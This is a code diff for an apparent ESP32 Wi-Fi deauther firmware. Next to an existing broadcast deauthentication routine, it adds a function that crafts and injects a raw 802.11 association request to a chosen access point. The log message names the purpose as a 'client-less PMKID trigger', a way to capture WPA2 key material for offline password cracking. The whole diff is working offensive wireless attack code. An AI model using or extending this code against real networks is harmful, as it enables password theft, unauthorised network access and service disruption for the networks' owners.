@@ -136,3 +136,69 @@ void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record, deau
   wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
 }
 
+void wifi_send_association_request(const wifi_ap_record_t *ap_record) {
+  if (ap_record == NULL) return;
+
+  // Switch to target channel first
+  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
+
+  // Construct Association Request Frame
+  // Fixed size parts + dynamic SSID len + Rates
+  uint8_t packet[128]; 
+  memset(packet, 0, sizeof(packet));
+  int idx = 0;
+
+  // --- MAC Header ---
+  packet[idx++] = 0x00; // Type: Mgmt (0), Subtype: Assoc Req (0)
+  packet[idx++] = 0x00; // Flags
+  packet[idx++] = 0x3a; // Duration (approx)
+  packet[idx++] = 0x01; 
+
+  // Addr1 (Dest): Target BSSID
+  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;
+
+  // Addr2 (Src): Our Station MAC (spoofing implies we use our current STA mac or random)
+  // Using hardware MAC for now to receive the reply easily
+  uint8_t my_mac[6];
+  esp_wifi_get_mac(WIFI_IF_STA, my_mac);
+  memcpy(&packet[idx], my_mac, 6); idx += 6;
+
+  // Addr3 (BSSID): Target BSSID
+  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;
+
+  // Seq Ctrl
+  packet[idx++] = 0x00; 
+  packet[idx++] = 0x00;
+
+  // --- Frame Body ---
+  // Capability Info (Ess + Privacy usually)
+  packet[idx++] = 0x31; 
+  packet[idx++] = 0x04; 
+
+  // Listen Interval
+  packet[idx++] = 0x0A; 
+  packet[idx++] = 0x00;
+
+  // Tag 0: SSID
+  packet[idx++] = 0x00; // Tag ID
+  uint8_t ssid_len = strlen((char *)ap_record->ssid);
+  packet[idx++] = ssid_len;
+  memcpy(&packet[idx], ap_record->ssid, ssid_len); idx += ssid_len;
+
+  // Tag 1: Supported Rates (Standard set)
+  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
+  packet[idx++] = 0x01; // Tag ID
+  packet[idx++] = sizeof(rates);
+  memcpy(&packet[idx], rates, sizeof(rates)); idx += sizeof(rates);
+
+  // Tag 50: Extended Supported Rates
+  uint8_t ext_rates[] = {0x0c, 0x12, 0x18, 0x60};
+  packet[idx++] = 50; // Tag ID
+  packet[idx++] = sizeof(ext_rates);
+  memcpy(&packet[idx], ext_rates, sizeof(ext_rates)); idx += sizeof(ext_rates);
+
+  // Send
+  ESP_LOGI(TAG, "Sending Association Request to target: %s (Client-less PMKID trigger)", ap_record->ssid);
+  wifi_deauther_send_raw_frame(packet, idx);
+}
+
